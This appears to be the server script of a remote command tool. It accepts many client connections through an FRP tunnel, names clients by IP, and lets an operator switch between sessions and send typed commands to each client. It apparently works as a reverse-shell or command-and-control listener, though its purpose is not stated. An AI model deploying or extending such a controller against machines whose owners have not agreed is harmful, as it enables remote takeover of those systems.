from _modules import banner, tunnel, kbhit
import os

os.system('cls')

print('\n\nWelcome To:')

banner.printBanner()

version = 'V0.3.1 BUILD 6'

print(banner.termcolor.colored(f'\n{version}\n\n','light_grey'))

print('[INIT] Importing libraries...')

import socket
from threading import Thread
kbhit = kbhit.KBHit()
from os import abort
from time import sleep
import json

client_sockets = []



sleep(0.25)
print('[INIT] Getting client names..')

try:
    with open('names.txt','r') as file:
        content = file.read()
        names = json.loads(content)
except FileNotFoundError:
    with open('names.txt','w') as file:
        names = {}
        file.write(json.dumps(names))
        


sleep(0.25)
print('[INIT] Initializing functions...')


def add_name(name,ip):
    names[ip] = name
    with open('names.txt','w') as file:
        file.write(json.dumps(names))

def get_name(ip):
    try: return names[ip]
    except KeyError: return None

def csHandler(cs,addr):
    try:
        cs.send('get ip'.encode())
        sleep(0.1)
        ip = cs.recv(1024).decode()
        
        if len(ip) > 16:
            raise Exception('Invalid IP address')
    except:
        cs.close()
        return
    
    name = get_name(ip)
    
    if clientIndex == 0:
        print(f'[{len(client_sockets)+1}] {ip}\n')
    else:
        print(f'[+] {ip} [{name}]\n')
        
    
    client_sockets.append(cs)
    index = len(client_sockets)
    a = Thread(target=inputHandler,args=(cs,addr,index,ip),daemon=True).start()
    while True:
        try:
            try: msg = cs.recv(1024).decode()
            except UnicodeDecodeError: pass
            if msg in [None,'']: continue
        except:
            print(f'[-] {ip} [{name}]')
            try:
                if clientIndex == client_sockets.index(cs):
                    global stop
                    stop = clientIndex
                client_sockets.remove(cs)
                s.close()
            except: pass
            break
        else:
            if index != clientIndex: print(f'[MSG] <{ip}> ({name}) {msg}') # [MSG] <127.0.0.1> (TestName) Hello, world!
            else: print(f'\r{msg}\n> ',end='')


def inputHandler(cs,addr,index,ip):
    global clientIndex
    oldIndex = 0
    cmd = ''
    while True:
        sleep(0.01)
        if stop == index:
            clientIndex = 0
            break
        if clientIndex == index:
            if not oldIndex == index:
                print(f'Entered session with client #{index} at {ip} [{get_name(ip)}]')
            if kbhit.kbhit():
                try: key = kbhit.getch()
                except UnicodeError:
                    continue
                if ord(key) == 27: # ESC to go to master instance
                    clientIndex = 0
                elif ord(key) == 13: # Enter = send command
                    cmd = ''.join(c for c in cmd if c.isprintable())
                    
                    if cmd.startswith('.'):
                        cmd = cmd.split(' ')
                        if cmd[0] == '.name':
                            if cmd[1] == 'set':
                                add_name(cmd[2], ip)
                                
                                print(f'\n[SERVER] Name of {ip} set to {cmd[2]}')
                            else:
                                print('[SERVER] Usage: .name set <name> <|ip|>')
                        else:
                            print('[SERVER] Invalid command.')
                        cmd = ''
                        
                    else:
                        try: cs.send(cmd.encode())
                        except:
                            try: client_sockets.remove(cs)
                            except: pass
                            cs.close()
                            break
                        cmd = ''
                        print('\n> ',end='')
                elif ord(key) == 8: # Backspace to erase char
                    cmd = cmd[:-1]
                    print(f'\r> {cmd}',end='   ') #>​<
                else:
                    cmd = cmd + key
                    print(key,end='')
        oldIndex = clientIndex
        

def masterInputHandler():
    sleep(0.3)
    global clientIndex
    oldIndex = -1
    cmd = ''
    while True:
        sleep(0.01)
        print('',end='',flush=True)
        if clientIndex == -1:
            clientIndex = 0
        if clientIndex == 0:
            if not oldIndex == 0:
                data = f''
                for cs in enumerate(client_sockets):
                    index, cs = cs
                    data = data + f'[{index+1}] {ip} [{get_name(ip)}]\n'
                print(f'Entered master handler. \n\nChoose a client to connect to:\n{data}')
            if kbhit.kbhit():
                key = kbhit.getch()
                print(key,end='')
                if ord(key) == 27: # ESC to stop server
                    print('\n|Master session closed.\n')
                    abort()
                elif ord(key) == 13: # Enter = send command
                    try:
                        clientIndex = int(cmd)
                        client_sockets[clientIndex-1]
                        cmd = ''
                        continue
                    except ValueError:
                        print(f'\nClient index must be a number. [{clientIndex}]\n')
                        clientIndex = 0
                    except IndexError:
                        print(f'\nClient index out of range. [{clientIndex}]\n')
                        clientIndex = 0
                    cmd = ''
                    print('')
                else:
                    cmd = cmd + key
        oldIndex = clientIndex


ip = '0.0.0.0'
port = 5000
addr = (ip,port)

sleep(0.35)
print('[INIT] Starting server..')

s = socket.socket()
s.bind(addr)
s.listen(10)




clientIndex = 0
stop = 0

sleep(0.4)
print('[INIT] Starting FRP Tunnel...')
tunnel.start()

sleep(0.3)
print('[INIT] Starting Masted handler..')
Thread(target=masterInputHandler,daemon=True).start()

sleep(0.2)
print('[INIT] Init complete!')

sleep(0.1)
print(banner.termcolor.colored(f'Server running on {addr}\n','dark_grey'))


while True:
    try:
        cs, addr = s.accept()
        
        # Start client handler when a client connects (the thread starts client input handler)
        Thread(target=csHandler,args=(cs,addr),daemon=True).start()

        sleep(0.1)

            
    except: pass